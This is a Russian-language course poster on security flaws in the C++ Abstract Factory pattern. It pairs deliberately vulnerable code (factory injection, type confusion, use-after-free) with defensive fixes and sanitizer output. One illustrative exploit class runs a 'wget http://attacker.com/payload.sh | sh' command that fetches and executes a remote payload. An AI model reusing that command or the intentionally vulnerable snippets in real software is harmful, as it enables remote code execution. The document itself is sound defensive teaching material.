# 🛡️ Security Poster: Abstract Factory Pattern

## 🎯 Обзор угроз Abstract Factory Pattern

```
┌────────────────────────────────────────────────────────────────────┐
│          КРИТИЧЕСКИЕ УЯЗВИМОСТИ ABSTRACT FACTORY PATTERN           │
└────────────────────────────────────────────────────────────────────┘

🔴 КРИТИЧНЫЕ УГРОЗЫ:
┌─────────────────────┬──────────────────────────────────────────────┐
│ Factory Injection   │ Malicious factory подмена в runtime          │
│                     │ Impact: RCE через malicious product creation │
├─────────────────────┼──────────────────────────────────────────────┤
│ Product Family Mix  │ Несовместимые продукты из разных families    │
│                     │ Impact: Type confusion, memory corruption    │
├─────────────────────┼──────────────────────────────────────────────┤
│ Use-After-Free      │ CWE-416: Products outlive factory            │
│                     │ Impact: UAF, heap corruption, RCE            │
└─────────────────────┴──────────────────────────────────────────────┘

🟡 ВЫСОКИЕ УГРОЗЫ:
┌─────────────────────┬──────────────────────────────────────────────┐
│ Memory Leaks        │ CWE-401: Multiple product creation leaks     │
│ Type Confusion      │ Mixing products from incompatible families   │
│ State Corruption    │ Shared state между product families          │
└─────────────────────┴──────────────────────────────────────────────┘
```

## 💣 Критическая уязвимость #1: Factory Injection

### Анатомия атаки

```cpp
// ❌ УЯЗВИМЫЙ КОД - Незащищенная factory подмена
class AbstractFactory {
public:
    virtual ~AbstractFactory() = default;
    virtual Product* createProductA() = 0;
    virtual Product* createProductB() = 0;
};

class Application {
private:
    AbstractFactory* factory_;  // ⚠️ Mutable factory pointer
    
public:
    void setFactory(AbstractFactory* factory) {
        factory_ = factory;  // ⚠️ No validation!
    }
    
    void run() {
        auto* productA = factory_->createProductA();
        auto* productB = factory_->createProductB();
        
        productA->interact(productB);  // 💥 May use malicious products
    }
};
```

### 🎯 Exploitation: Malicious factory injection

```cpp
// ЭКСПЛОЙТ: Injection malicious factory
class MaliciousProduct : public ProductA {
public:
    void interact(ProductB* other) override {
        // 💥 Malicious behavior
        system("wget http://attacker.com/payload.sh | sh");
        exfiltrateCredentials();
        escalatePrivileges();
    }
};

class MaliciousFactory : public AbstractFactory {
public:
    Product* createProductA() override {
        return new MaliciousProduct();  // 💥 Malicious product
    }
    
    Product* createProductB() override {
        return new MaliciousProductB();  // 💥 Malicious product
    }
};

void exploit() {
    Application app;
    
    // Легитимное использование
    app.setFactory(new ConcreteFactory1());
    
    // АТАКА: Подмена factory
    // Может произойти через:
    // - Configuration injection
    // - Plugin loading без validation
    // - Deserialization attack
    // - Memory corruption
    
    app.setFactory(new MaliciousFactory());  // 💥 Injection!
    
    app.run();
    // → Создает malicious products
    // → RCE, data exfiltration, privilege escalation
}
```

### ✅ Защита: Validated factory registration

```cpp
// ✅ БЕЗОПАСНЫЙ КОД - Whitelist-based factory system
class SecureApplication {
private:
    std::unique_ptr<AbstractFactory> factory_;
    
    // Whitelist допустимых factories
    static const std::set<std::type_index> ALLOWED_FACTORIES;
    
    bool isFactoryAllowed(const std::type_info& type) const {
        return ALLOWED_FACTORIES.find(std::type_index(type)) 
               != ALLOWED_FACTORIES.end();
    }
    
public:
    template<typename FactoryT>
    void setFactory(std::unique_ptr<FactoryT> factory) {
        // ✅ Validate against whitelist
        if (!isFactoryAllowed(typeid(FactoryT))) {
            throw SecurityException(
                "Factory type not whitelisted: " + 
                std::string(typeid(FactoryT).name())
            );
        }
        
        // ✅ Signature verification (если factory из config)
        if (!verifyFactorySignature(factory.get())) {
            throw SecurityException("Factory signature invalid");
        }
        
        // ✅ Audit log
        logFactoryChange(typeid(FactoryT).name());
        
        factory_ = std::move(factory);
    }
    
    void run() {
        if (!factory_) {
            throw std::runtime_error("No factory set");
        }
        
        auto productA = factory_->createProductA();
        auto productB = factory_->createProductB();
        
        productA->interact(productB.get());
    }
};

const std::set<std::type_index> SecureApplication::ALLOWED_FACTORIES = {
    std::type_index(typeid(ConcreteFactory1)),
    std::type_index(typeid(ConcreteFactory2))
    // ТОЛЬКО safe factories
};
```

## 💣 Критическая уязвимость #2: Product Family Mix

### Анатомия атаки

```cpp
// ❌ УЯЗВИМЫЙ КОД - Mixing products from different families
class WindowsButton : public Button {
    void paint() override { /* Windows-specific */ }
};

class MacOSCheckbox : public Checkbox {
    void paint() override { /* MacOS-specific */ }
};

void vulnerableUsage() {
    // Создаем products из РАЗНЫХ families
    Button* button = new WindowsButton();      // Windows family
    Checkbox* checkbox = new MacOSCheckbox();  // MacOS family
    
    // Пытаемся использовать вместе
    UI ui;
    ui.add(button);
    ui.add(checkbox);  // 💥 Incompatible products!
    
    // Rendering может предполагать одну платформу
    // Приводит к:
    // - Visual corruption
    // - Crashes (different layouts, APIs)
    // - Type confusion (casting to wrong concrete type)
}
```

### 🎯 Exploitation: Type confusion через family mix

```cpp
// ЭКСПЛОЙТ: Exploit type confusion
class WindowsUI {
    void render(Button* button, Checkbox* checkbox) {
        // Предполагает что оба - Windows products
        auto* winButton = static_cast<WindowsButton*>(button);
        auto* winCheckbox = static_cast<WindowsCheckbox*>(checkbox);
        
        // ⚠️ winCheckbox на самом деле MacOSCheckbox!
        winCheckbox->useWindowsAPI();  // 💥 Type confusion!
        
        // Memory layout MacOSCheckbox != WindowsCheckbox
        // → Reads wrong offsets
        // → Memory corruption
        // → Potential RCE
    }
};

void exploit_family_mix() {
    AbstractFactory* factory1 = new WindowsFactory();
    AbstractFactory* factory2 = new MacOSFactory();
    
    // АТАКА: Mix products from different factories
    Button* button = factory1->createButton();      // Windows
    Checkbox* checkbox = factory2->createCheckbox(); // MacOS
    
    WindowsUI ui;
    ui.render(button, checkbox);
    // 💥 Type confusion → memory corruption → RCE
}
```

### ✅ Защита: Family consistency enforcement

```cpp
// ✅ БЕЗОПАСНЫЙ КОД - Type-safe product families
enum class ProductFamily {
    WINDOWS,
    MACOS,
    LINUX
};

class TypeSafeAbstractFactory {
private:
    const ProductFamily family_;
    
protected:
    TypeSafeAbstractFactory(ProductFamily family) : family_(family) {}
    
public:
    virtual ~TypeSafeAbstractFactory() = default;
    
    ProductFamily getFamily() const { return family_; }
    
    virtual std::unique_ptr<Button> createButton() = 0;
    virtual std::unique_ptr<Checkbox> createCheckbox() = 0;
};

class ProductFamilyValidator {
public:
    static void validate(
        const Button& button,
        const Checkbox& checkbox,
        ProductFamily expected_family) {
        
        // ✅ Runtime проверка family consistency
        if (button.getFamily() != expected_family ||
            checkbox.getFamily() != expected_family) {
            throw std::runtime_error("Product family mismatch detected!");
        }
    }
};

// Еще лучше: Compile-time enforcement с templates
template<ProductFamily Family>
class TypedFactory;

template<>
class TypedFactory<ProductFamily::WINDOWS> {
public:
    std::unique_ptr<WindowsButton> createButton() {
        return std::make_unique<WindowsButton>();
    }
    
    std::unique_ptr<WindowsCheckbox> createCheckbox() {
        return std::make_unique<WindowsCheckbox>();
    }
    // ✅ Compile-time гарантия что products из одной family
};
```

## 💣 Критическая уязвимость #3: Use-After-Free (Products outlive Factory)

### Анатомия атаки

```cpp
// ❌ УЯЗВИМЫЙ КОД - Products держат reference на factory
class Product {
protected:
    AbstractFactory* factory_;  // ⚠️ Dangling pointer risk
    
public:
    Product(AbstractFactory* factory) : factory_(factory) {}
    
    void refresh() {
        // Пересоздаем себя через factory
        auto* new_product = factory_->createProduct();  // 💥 UAF!
        // ...
    }
};

void vulnerable() {
    Product* product;
    
    {
        std::unique_ptr<AbstractFactory> factory = 
            std::make_unique<ConcreteFactory>();
        
        product = factory->createProduct();
        // product содержит pointer на factory
    }
    // factory destroyed здесь
    
    // product->factory_ теперь dangling pointer
    product->refresh();  // 💥 Use-After-Free!
}
```

### ✅ Защита: Weak references или self-contained products

```cpp
// ✅ БЕЗОПАСНЫЙ КОД - Products не зависят от factory
class SelfContainedProduct {
    // ✅ Нет reference на factory
    // Все необходимые данные копируются при создании
    
public:
    SelfContainedProduct(const Config& config) {
        // Copy необходимые данные
    }
    
    void refresh() {
        // Не требует factory для refresh
        reloadFromConfig();
    }
};

// Альтернатива: std::weak_ptr если reference необходим
class SafeProduct {
private:
    std::weak_ptr<AbstractFactory> factory_;  // ✅ Weak reference
    
public:
    SafeProduct(std::shared_ptr<AbstractFactory> factory) 
        : factory_(factory) {}
    
    void refresh() {
        if (auto factory = factory_.lock()) {  // ✅ Safe check
            auto new_product = factory->createProduct();
            // ...
        } else {
            throw std::runtime_error("Factory no longer available");
        }
    }
};
```

## 🛠️ Инструменты детектирования

### 1. ASan - UAF Detection

```bash
g++ -fsanitize=address -g abstract_factory_vulnerabilities.cpp -o factory_asan

./factory_asan
```

**Вывод ASan**:
```
=================================================================
==12345==ERROR: AddressSanitizer: heap-use-after-free
READ of size 8 at 0x602000000010 thread T0
    #0 0x400b12 in Product::refresh() factory.cpp:78
    
0x602000000010 freed by:
    #0 operator delete
    #1 std::unique_ptr<AbstractFactory>::~unique_ptr() factory.cpp:145
```

### 2. UBSan - Type Confusion Detection

```bash
g++ -fsanitize=undefined -g abstract_factory_vulnerabilities.cpp -o factory_ubsan

./factory_ubsan
```

**Вывод UBSan**:
```
factory.cpp:89:12: runtime error: downcast to type 'WindowsCheckbox*' 
which does not point to an object of that type
note: object is of type 'MacOSCheckbox'
```

## 📋 Security Checklist для Abstract Factory

### Design Phase
```
[ ] Определены все product families
[ ] Документирована family compatibility
[ ] Определена ownership model
[ ] Рассмотрены factory injection risks
```

### Implementation Phase
```
[ ] Whitelist validation для factories
[ ] Family consistency checks
[ ] std::unique_ptr для ownership
[ ] Нет dangling references между products и factory
[ ] Type-safe factory selection (enum или template)
```

### Testing Phase
```
[ ] Family mix tests (incompatible products)
[ ] UAF tests с AddressSanitizer
[ ] Type confusion tests с UBSan
[ ] Factory injection tests
[ ] Memory leak tests
```

### Deployment Phase
```
[ ] Factory selection logging
[ ] Monitoring для family mismatches
[ ] Configuration validation
```

## 🎓 Best Practices

### 1. Template-Based Type-Safe Abstract Factory

```cpp
// ✅ Compile-time type safety
template<typename ButtonT, typename CheckboxT>
class TypedAbstractFactory {
public:
    std::unique_ptr<ButtonT> createButton() {
        return std::make_unique<ButtonT>();
    }
    
    std::unique_ptr<CheckboxT> createCheckbox() {
        return std::make_unique<CheckboxT>();
    }
    
    // ✅ Compiler enforces consistency
};

using WindowsFactory = TypedAbstractFactory<WindowsButton, WindowsCheckbox>;
using MacOSFactory = TypedAbstractFactory<MacOSButton, MacOSCheckbox>;
// Невозможно смешать products из разных families
```

### 2. Registry Pattern с Validation

```cpp
// ✅ Centralized factory registry с whitelist
class FactoryRegistry {
    std::map<std::string, std::function<std::unique_ptr<AbstractFactory>()>> registry_;
    std::set<std::string> whitelist_;
    
public:
    void registerFactory(const std::string& name,
                        std::function<std::unique_ptr<AbstractFactory>()> creator) {
        if (whitelist_.find(name) == whitelist_.end()) {
            throw SecurityException("Factory not whitelisted");
        }
        registry_[name] = creator;
    }
    
    std::unique_ptr<AbstractFactory> create(const std::string& name) {
        auto it = registry_.find(name);
        if (it != registry_.end()) {
            return it->second();
        }
        throw std::runtime_error("Unknown factory");
    }
};
```

## 💡 Золотое правило Abstract Factory Security

```
┌────────────────────────────────────────────────────────────────┐
│                                                                │
│  "Abstract Factory создает product families.                  │
│   Validate factory selection (whitelist).                     │
│   Enforce family consistency (type safety).                   │
│   Avoid dangling references (weak_ptr or self-contained)."    │
│                                                                │
│  Никогда не смешивайте products из разных families.           │
│  Всегда validate factory перед injection.                     │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

---

**Версия**: 1.0  
**Дата**: 2025-10-11  
**Курс**: Patterns (Security Integration Track)  
**Лицензия**: MIT

